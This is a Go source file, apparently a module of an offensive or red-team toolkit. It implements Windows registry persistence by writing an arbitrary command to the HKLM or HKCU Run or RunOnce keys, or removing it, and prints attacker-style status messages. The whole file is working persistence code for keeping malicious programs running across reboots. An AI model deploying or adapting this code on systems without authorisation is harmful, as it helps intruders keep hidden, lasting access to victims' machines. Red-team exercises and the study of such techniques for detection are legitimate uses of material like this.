package techniques

// importing packages including the sys/windows/registry package for reg changes
import (
	"golang.org/x/sys/windows/registry"
	"log"
	"fmt"
)

// main registry persistence function, takes string arguments for the persistence command, the registry value (name under the key), registry key option (options displayed 
// under help), and the method argument (add or remove) 
func RegPersist(com string, regValue string, regKey string, method string) {

	fmt.Printf("[+] Attempting to %s registry persistence with the %s registry key option\n",method,regKey)

	// initializes the hivekey and hivepath variables and sets them based on the registry key option
	var hivekey registry.Key
	var hivepath string

	if regKey == "hklmrunonce"{
		hivekey = registry.LOCAL_MACHINE
		hivepath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
	} else if regKey == "hklmrun"{
		hivekey = registry.LOCAL_MACHINE
		hivepath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
	} else if regKey == "hkcurunonce"{
		hivekey = registry.CURRENT_USER
		hivepath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
	} else if regKey == "hkcurun"{
		hivekey = registry.CURRENT_USER
		hivepath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
	} else {
		fmt.Printf("[!] %s is not a valid registry key option\n", regKey)
		return
	}
	// attempts to open the registry key with all access
	key,err := registry.OpenKey(hivekey,hivepath,registry.ALL_ACCESS)
	if err != nil {
		log.Fatalln(err)
	}

	fmt.Print("[+] Opened the registry key with all access\n")

	// checks method and attempts to set the persistence method or remove it
	if method == "add"{
		if err := key.SetStringValue(regValue, com); err != nil {
			log.Fatalln(err)
		}
		if err := key.Close(); err != nil {
			log.Fatalln(err)
		}
		fmt.Printf("[+] Successfully set the %s registry value with \"%s\"!\n",regValue,com)
	} else if method == "remove" {
		if err := key.DeleteValue(regValue); err != nil {
			log.Fatalln(err)
		}
		if err := key.Close(); err != nil {
			log.Fatalln(err)
		}
		fmt.Printf("[+] Successfully removed the %s registry value!\n",regValue)
	} else {
		fmt.Printf("[!] %s is not a valid method for registry persistence",method)
		return
	}
}